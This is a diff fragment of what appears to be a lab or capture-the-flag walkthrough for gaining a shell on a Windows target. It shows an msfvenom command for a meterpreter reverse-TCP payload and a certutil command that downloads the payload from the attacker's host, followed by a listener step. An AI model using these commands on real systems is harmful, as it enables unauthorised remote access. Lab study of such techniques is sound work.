@@ -71,7 +71,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.117 LPORT=7777 -f
 ## 2. Transfer the Payload to the target (certutil)
 
 ```bash
-certutil.exe -urlcache -f http://10.10.14.117:8080/reverse.aspx reverse.aspx
+certutil.exe -urlcache -f http://10.10.14.117:8080/SHELL_ATTACK.exe SHELL_ATTACK.exe
 ```
 ## 3. Setup Listener 
 
